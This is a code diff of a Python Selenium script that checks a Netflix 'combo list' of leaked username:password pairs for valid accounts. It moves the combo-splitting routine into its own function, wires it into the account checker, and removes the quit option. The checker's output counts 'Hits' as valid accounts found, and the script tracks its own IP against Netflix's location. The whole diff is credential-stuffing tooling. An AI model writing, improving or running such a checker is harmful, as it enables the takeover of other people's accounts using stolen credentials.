@@ -13,11 +13,33 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver import ActionChains
 
+
+def splitter():
+    # Combo Splitter
+    title()
+    users = []
+    passwords = []
+    try:
+        with open('netflix', 'r') as net:
+            for line in net.readlines():
+                users.append(line.split(":")[0])
+                passwords.append(line.split(":")[1].split(" ")[0])
+            print("\n\033[38;5;7mUser : password combinations sorted.\n\nYou can now run the checker.")
+            input("\n\nPress Enter...")
+        return users, passwords
+    except IndexError:
+        print(
+            "\n\n\033[38;5;255mThere is something wrong with the combolist.\nCheck for extra spaces, extra characters\nOr anything else that shouldn't be there.\nEnding.")
+        exit()
+    except FileNotFoundError:
+        print(
+            "\n\n\033[38;5;255mCombo-list not found. Place it in the main directory,\nand make sure it's named 'netflix' (no file extension, or capitalization).\nEnding.")
+        exit()
+
+
 details = [find_IP()[0], find_IP()[1], find_IP()[2]]
 counter = 0
 hits = 0
-user = []
-passw = []
 updated_list = []
 files = []
 resume_flag = False
@@ -34,10 +56,13 @@ while True:
     title()
     print("\n\033[38;5;7mCurrent IP: {} - Netflix's location: {}\n".format(details[0], details[1]))
     user_options()
-    options = input("Pick an option or (q)uit: ")
+    options = input("Pick an option: ")
     while True:
         if options == "1":
             #Account Checker
+            combos = splitter()
+            user = combos[0]
+            passw = combos[1]
             title()
             if resume_flag:
                 print("\033[38;5;7m\nResume file found. Resuming from given combo.")
@@ -110,30 +135,13 @@ while True:
                 sys.stdout.write("\033[38;5;7m\x1b7\x1b[0;14fHits: %s Valid Accounts (Tried %s out of %s)\x1b8" % (
                     hits, str(counter), str(len(user))))
                 sys.stdout.flush()
+
             print("\n\033[38;5;226mAll done.")
             input("\n\033[38;5;226mPress Enter.")
             if resume_flag:
                 os.remove('resume')
             break
         if options == "2":
-            #Combo Splitter
-            title()
-            user = []
-            passw = []
-            try:
-                with open('netflix', 'r') as net:
-                    for line in net.readlines():
-                        user.append(line.split(":")[0])
-                        passw.append(line.split(":")[1].split(" ")[0])
-                    print("\n\033[38;5;7mUser : password combinations sorted.\n\nYou can now run the checker.")
-                    input("\n\nPress Enter...")
-            except IndexError:
-                print("\n\n\033[38;5;255mThere is something wrong with the combolist.\nCheck for extra spaces, extra characters\nOr anything else that shouldn't be there.\nEnding.")
-                exit()
-            except FileNotFoundError:
-                print("\n\n\033[38;5;255mCombo-list not found. Place it in the main directory,\nand make sure it's named 'netflix' (no file extension, or capitalization).\nEnding.")
-                exit()
-        if options == "q":
             #Exit
             exit()
         else:
